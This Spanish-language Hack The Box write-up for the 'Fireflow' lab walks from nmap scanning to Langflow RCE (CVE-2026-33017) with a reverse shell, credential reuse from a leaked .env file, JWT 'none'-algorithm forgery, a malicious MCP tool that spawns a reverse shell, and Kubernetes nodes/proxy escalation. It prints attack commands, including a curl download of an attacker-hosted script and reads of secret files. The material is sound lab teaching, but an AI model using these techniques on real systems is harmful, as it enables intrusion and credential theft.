---
title: "HTB Fireflow - Write-Up"
date: 2026-07-07
categories: [Hack The Box]
tags: [langflow, cve-2026-33017, rce, jwt, kubernetes, privilege-escalation, mcp]
---

### Escaneo de puertos


Primero, realicé un escaneo rápido de todos los puertos con nmap:


```bash
nmap -sS 10.129.44.248
```


<img width="532" height="260" alt="1 Escaneo nmap" src="https://github.com/user-attachments/assets/04a6c201-c63b-44f5-a2cb-a21c5430377b" />


Se identifican los puertos 22 (SSH) y 443 (HTTPS) como abiertos, además de varios puertos filtrados entre los que destaca el 30080, que usaremos más adelante. También se detecta el hostname `fireflow.htb`, que añadimos a nuestro `/etc/hosts`:


```bash
echo "10.129.44.248 fireflow.htb" | sudo tee -a /etc/hosts
```


<img width="1033" height="130" alt="2 añadir a etc hosts el dominio" src="https://github.com/user-attachments/assets/7a9ab992-2173-401b-8faf-35e5ab9dee76" />


### Enumeración web


Al acceder a `https://fireflow.htb` encontramos una plataforma interna llamada FireFlow perteneciente a "Task Force Nightfall". En la página principal se puede ver una tarjeta del agente **Nightfall AI Agent** que expone públicamente el `flow_id` y un botón "Open Agent":


<img width="1918" height="931" alt="3 pagina web descubierta" src="https://github.com/user-attachments/assets/5912608d-e036-41b6-b801-35d9a921a88f" />


El botón nos redirige a un nuevo vHost `flow.fireflow.htb`, que también añadimos al `/etc/hosts`. La URL nos lleva directamente al playground de Langflow con el `flow_id` expuesto: 
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25


<img width="810" height="75" alt="4 1 flowid" src="https://github.com/user-attachments/assets/1b3692fc-3153-4e34-8df1-e27a141e6d92" />


### Foothold — CVE-2026-33017 (Langflow RCE)


Buscando vulnerabilidades para Langflow, encontramos el **CVE-2026-33017**, que permite ejecución remota de código sin autenticación conociendo únicamente un `flow_id` válido. Existe un PoC público en GitHub:


<img width="1135" height="668" alt="4 Reposotorio del exploit del CVE" src="https://github.com/user-attachments/assets/465b6a6d-1d83-48aa-ba47-f205ddc7cade" />


Ponemos un listener en nuestra máquina y lanzamos el exploit:


```bash
nc -lvnp 9001

python3 exploit.py --url https://flow.fireflow.htb \
--flow-id 7d84d636-af65-42e4-ac38-26e867052c25 \
--lhost 10.10.15.5 --lport 4444
```

<img width="532" height="260" alt="1 Escaneo nmap" src="https://github.com/user-attachments/assets/f9413aee-2f9e-462f-9237-a2f63b5527f7" />


<img width="1082" height="173" alt="5 ejecución de exploit" src="https://github.com/user-attachments/assets/da950f87-0d0d-4154-9334-0c6e95bba41c" />


Obtenemos una shell como `www-data`. Enumerando el sistema, encontramos el archivo `.env` de Langflow con credenciales en texto claro:

```bash
cat /etc/langflow/.env
```


<img width="655" height="592" alt="6 vemos el archivo de contraseñas" src="https://github.com/user-attachments/assets/7d1b66e5-1b9e-4f5f-881e-bd556ea7c7a2" />


Entre las variables destaca `LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll`. Revisando `/etc/passwd` vemos que existe el usuario `nightfall`. Probamos la reutilización de credenciales por SSH:


```bash
ssh nightfall@fireflow.htb
# password: n1ghtm4r3_b4_n1ghtf4ll
```


<img width="564" height="180" alt="7 contraseña nightmare" src="https://github.com/user-attachments/assets/35483c5f-b521-4fa5-ad21-690414104d6a" />


<img width="236" height="31" alt="8 dentro de ssh" src="https://github.com/user-attachments/assets/47b70b80-e904-4ffc-89c8-bf6d095c1888" />


Acceso concedido. La flag de usuario se encuentra en `/home/nightfall/user.txt`.


### Movimiento lateral — JWT forgery (algoritmo none)


En el directorio home de `nightfall` encontramos un directorio oculto `.mcp` con un fichero `config.json` que filtra credenciales y la dirección de un servidor MCP interno:


```bash
cat ~/.mcp/config.json
```


<img width="356" height="114" alt="9 config json" src="https://github.com/user-attachments/assets/508a6232-c40a-4f5d-ad3b-4b7ea7bc225d" />


Consultamos el endpoint del servidor y observamos que entre los algoritmos JWT soportados figura `none`:


```bash
curl -s http://10.129.44.248:30080/api/v1/version | python3 -m json.tool
```


<img width="794" height="323" alt="10 endpoint file reveals" src="https://github.com/user-attachments/assets/901b9a35-fa80-436c-b10e-4ab827c6f7c6" />


Obtenemos un token legítimo con las credenciales filtradas:


```bash
curl -s -X POST http://10.129.44.248:30080/api/v1/auth \
-H 'Content-Type: application/json' \
-d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```


<img width="1594" height="73" alt="11 Obtención access token" src="https://github.com/user-attachments/assets/b4d50f9e-f1f7-4f76-a0e6-9464423ae3db" />


Decodificamos el token y confirmamos que nuestro rol es `user`:


```bash
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null
```


<img width="1604" height="39" alt="12 decode token" src="https://github.com/user-attachments/assets/61e4e22b-8366-4ca2-89a7-552433ebbab8" />


El endpoint `POST /api/v1/tools` requiere rol `admin`:


<img width="764" height="68" alt="13 verificación de rol de admin" src="https://github.com/user-attachments/assets/da0da5b6-9f52-40c3-970e-a59127f0cd47" />


<img width="678" height="79" alt="14 verificamos que requiere rol de admin" src="https://github.com/user-attachments/assets/a86563f7-3f69-42c1-a39b-a4106aed8ee4" />


Aprovechamos el algoritmo `none` para forjar un JWT con rol `admin` sin necesidad de conocer el secreto:


```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}, separators=(',',':')).encode())
print(f"{header}.{payload}.")
```


Con el token forjado registramos una tool maliciosa que lanza una reverse shell:


```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."

curl -s -X POST http://10.129.44.248:30080/api/v1/tools \
-H 'Content-Type: application/json' \
-H "Authorization: Bearer $ADMIN_JWT" \
-d '{
  "name": "shell",
  "description": "debug shell",
  "inputSchema": {"type":"object","properties":{}},
  "code": "import socket,os,pty\n..."
}'
```


<img width="1913" height="66" alt="15 registro de la herramienta para conexión a mcp" src="https://github.com/user-attachments/assets/5df68c50-89cc-486d-9859-461db48800c7" />


Lanzamos la tool para activar la conexión:


```bash
curl -s -X POST http://10.129.44.248:30080/mcp \
-H 'Content-Type: application/json' \
-H "Authorization: Bearer $ADMIN_JWT" \
-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```


<img width="521" height="68" alt="16 conexión a mcp" src="https://github.com/user-attachments/assets/2344a632-28e8-4756-8d2a-3042d0e35083" />


Recibimos la shell como `mcp` y realizamos el tratamiento de TTY:


```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Enter dos veces
```


<img width="504" height="131" alt="17 tratamiento tty" src="https://github.com/user-attachments/assets/12672c94-563e-4f8f-8db6-e25172314fb4" />


<img width="360" height="64" alt="18 tratamiento tty2" src="https://github.com/user-attachments/assets/8821141c-f394-4577-8590-8222e8620170" />


### Escalada de privilegios — Kubernetes nodes/proxy


Enumerando el entorno detectamos que estamos dentro de un pod de Kubernetes:


```bash
ls /var/run/secrets/kubernetes.io/serviceaccount
env
```


<img width="660" height="512" alt="19 variables del entorno" src="https://github.com/user-attachments/assets/57312180-6178-45eb-b46d-f97c7607625f" />


Comprobamos los permisos de nuestra service account y descubrimos que tenemos el permiso `nodes/proxy`, extremadamente peligroso si existe algún pod privilegiado:


Enumerando los pods encontramos uno privilegiado del namespace `monitoring` con `hostPath` montado en `/`, lo que significa que tiene acceso al sistema de archivos del host.


Creamos un script en Python que aprovecha el permiso `nodes/proxy` para ejecutar comandos arbitrarios en ese pod vía WebSocket:


```bash
cat kube_exec.py
```


<img width="702" height="709" alt="20 creacion de script de python" src="https://github.com/user-attachments/assets/1e6f4f2f-f100-40f0-bf9b-023d1e0d9386" />


Levantamos un servidor HTTP en nuestra Kali para transferir el script al pod:


```bash
sudo python3 -m http.server 80
```


<img width="457" height="52" alt="21 servidor python para transferir el script" src="https://github.com/user-attachments/assets/4358c44c-8254-427c-b9f7-0fc61638a1bc" />


Descargamos el script desde el pod:


```bash
curl 10.10.15.5/kube_exec.py -o exec.py
```


<img width="646" height="62" alt="22 transferimos el archivo" src="https://github.com/user-attachments/assets/3dfea1bd-4ad2-42f5-9223-40ca5f7b0b2f" />


Ejecutamos el script apuntando al sistema de archivos del host y leemos la flag de root:


```bash
python3 exec.py "cat /host/root/root/root.txt"
```


<img width="639" height="31" alt="23 conseguimos la flag de root" src="https://github.com/user-attachments/assets/913c19a9-6a5a-464c-aa1a-09babba6af89" />
